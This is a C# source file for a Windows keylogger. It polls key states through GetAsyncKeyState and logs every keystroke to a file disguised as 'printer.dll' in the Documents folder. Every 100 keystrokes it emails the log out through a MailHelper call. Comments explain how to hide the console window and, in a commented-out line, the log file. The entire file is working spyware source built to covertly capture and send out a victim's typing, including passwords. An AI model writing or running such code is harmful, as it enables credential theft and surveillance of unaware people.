#region - Using

using Helper;
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

#endregion - Using

namespace Keylogger
{
    internal class Program
    {
        /*
            konsolu gizlemek için csproj içindeki
            <OutputType>Exe</OutputType> 'yi
            <OutputType>WinExe</OutputType> yap
        */

        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        //string to hold all of the keystrokes
        private static long numberOfKeystrokes = 0;

        private static void Main(string[] args)
        {
            String filePath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);

            if (!Directory.Exists(filePath))
            {
                Directory.CreateDirectory(filePath);
            }

            string path = (filePath + @"\printer.dll");

            if (!File.Exists(path))
            {
                using (StreamWriter sw = File.CreateText(path))
                {
                }
            }

            //File.SetAttributes(path, File.GetAttributes(path) | FileAttributes.Hidden);

            //asciitable.com
            int asciTableData = 127;

            //plan
            //1- capture keystrokes and display them to the console
            while (true)
            {
                //pause and let other programs get a change to run
                Thread.Sleep(5);

                //check all keys for their state
                for (int i = 32; i < asciTableData; i++)
                {
                    int keyState = GetAsyncKeyState(i);

                    //print to the console
                    if (keyState == 32769)
                    {
                        //Console.Write((char)i + ", ");

                        //2- store the strokes into a text file
                        using (StreamWriter sw = File.AppendText(path))
                        {
                            sw.Write((char)i);
                        }

                        numberOfKeystrokes++;

                        //3- periodically send the contents of the file to an external email address
                        //send every 100 characters typed.
                        if (numberOfKeystrokes % 100 == 0)
                        {
                            MailHelper.SendNewMessage(@"\printer.dll");
                        }
                    }
                }
            }
        }
    }
}